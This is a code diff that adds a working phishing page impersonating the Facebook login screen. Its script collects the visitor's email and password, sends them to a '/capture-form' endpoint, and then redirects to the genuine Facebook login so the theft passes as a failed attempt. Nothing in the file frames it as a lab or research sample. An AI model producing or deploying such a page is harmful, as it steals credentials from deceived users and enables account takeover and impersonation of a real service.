@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Facebook &ndash; log in or sign up</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#f0f2f5;font-family:Helvetica,Arial,sans-serif;color:#1c1e21}
+.page{min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:1rem}
+.inner{display:flex;align-items:center;gap:4rem;max-width:960px;width:100%}
+.brand{flex:1}
+.brand-logo{color:#1877f2;font-size:3.5rem;font-weight:bold;line-height:1.1;margin-bottom:1rem}
+.brand-tagline{font-size:1.4rem;color:#1c1e21;line-height:1.4}
+.login-card{background:#fff;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1),0 8px 16px rgba(0,0,0,.1);padding:1.5rem;width:100%;max-width:396px}
+.input-field{width:100%;border:1px solid #dddfe2;border-radius:6px;padding:0.9rem 1rem;font-size:1rem;outline:none;margin-bottom:0.75rem;color:#1c1e21;transition:border-color 0.2s}
+.input-field:focus{border-color:#1877f2;box-shadow:0 0 0 2px #e7f3ff}
+.login-btn{width:100%;background:#1877f2;color:#fff;border:none;border-radius:6px;padding:0.9rem;font-size:1.1rem;font-weight:700;cursor:pointer;transition:background 0.2s;margin-bottom:1rem}
+.login-btn:hover{background:#166fe5}
+.forgot-link{color:#1877f2;font-size:0.875rem;text-decoration:none;display:block;text-align:center;margin-bottom:1rem}
+.forgot-link:hover{text-decoration:underline}
+.divider{border-top:1px solid #dddfe2;margin:1rem 0}
+.create-btn{width:100%;background:#42b72a;color:#fff;border:none;border-radius:6px;padding:0.75rem;font-size:0.95rem;font-weight:700;cursor:pointer;transition:background 0.2s}
+.create-btn:hover{background:#36a420}
+@media(max-width:768px){.inner{flex-direction:column;gap:2rem}.brand{text-align:center}.brand-logo{font-size:2.5rem}}
+</style>
+</head>
+<body>
+<div class="page">
+  <div class="inner">
+    <div class="brand">
+      <div class="brand-logo">facebook</div>
+      <div class="brand-tagline">Connect with friends and the world around you on Facebook.</div>
+    </div>
+    <div class="login-card">
+      <input class="input-field" type="text" id="EmailInput" placeholder="Email address or phone number" autocomplete="email">
+      <input class="input-field" type="password" id="PasswordInput" placeholder="Password" autocomplete="current-password">
+      <button class="login-btn" onclick="SubmitLogin()">Log in</button>
+      <a href="#" class="forgot-link">Forgotten password?</a>
+      <div class="divider"></div>
+      <button class="create-btn">Create new account</button>
+    </div>
+  </div>
+</div>
+<script src="/static/Tracker.js"></script>
+<script>
+function SubmitLogin() {
+  const Email = document.getElementById("EmailInput").value.trim();
+  const Password = document.getElementById("PasswordInput").value;
+  if (!Email || !Password) return;
+  fetch("/capture-form", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ Username: Email, Password: Password })
+  }).then(function () {
+    window.location.href = "https://www.facebook.com/login/device-based/regular/login/?login_attempt=1";
+  }).catch(function () {
+    window.location.href = "https://www.facebook.com/";
+  });
+}
+document.getElementById("PasswordInput").addEventListener("keydown", function (Event) {
+  if (Event.key === "Enter") SubmitLogin();
+});
+</script>
+</body>
+</html>
